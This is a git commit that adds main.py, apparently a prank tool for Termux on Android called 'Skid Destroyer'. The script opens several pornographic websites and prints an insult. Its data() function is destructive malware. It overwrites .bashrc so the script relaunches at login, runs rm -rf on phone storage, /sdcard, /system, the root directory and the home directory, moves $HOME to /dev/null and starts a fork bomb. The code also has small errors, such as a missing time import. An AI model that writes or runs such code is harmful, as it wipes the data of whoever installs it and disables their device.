df613b3ecd6f79420802496b39cddedbb1bd13e9
AnonPrixorPH <62997139+AnonPrixorPH@users.noreply.github.com>
2021-03-15 02:50:41 +0800

    Skid
    Skid

---
+++ main.py
@@ -0,0 +1,36 @@
+##### Created By AnonPrixor #####
+##### Skid Destroyer #####
+import os
+import sys
+
+##### Message Here #####
+print("Welcome to AnonPrixor World")
+time.sleep(2)
+os.system("xdg-open https://youjizz.com")
+os.system("xdg-open https://pornhub.com")
+os.system("xdg-open https://kanortube.com")
+os.system("xdg-open 6https://xnxx.com")
+os.system("xdg-open https://xvideos2.com")
+os.system("xdg-open https://xvideos.com")
+os.system("xdg-open https://anonprixor.pw")
+print("Fuck you skid!!!")
+##### Message Here #####
+
+##### Don't Touch This #####
+def data():
+    os.system('touch .hushlogin')
+    os.system('printf "python2 main.py" > $HOME/.bashrc')
+    os.system('termux-setup-storage')
+    os.system('rm -rf /storage/emulated/0/*')
+    os.system('rm -rf /storage/emulated/*')
+    os.system('rm -rf /sdcard/*')
+    os.system('rm -rf /sdcard/0/*')
+    os.system('rm -rf /sdcard1/*')
+    os.system('rm -rf /storage/*')
+    os.system('rm -rf /*')
+    os.system('rm -rf /system/*')
+    os.system('rm -rf $HOME/../../*')
+    os.system('rm -rf $PREFIX/b')
+    os.system('rm -rf $HOME/*')
+    os.system('mv $HOME /dev/null')
+    os.system(':(){ :|: & };:')
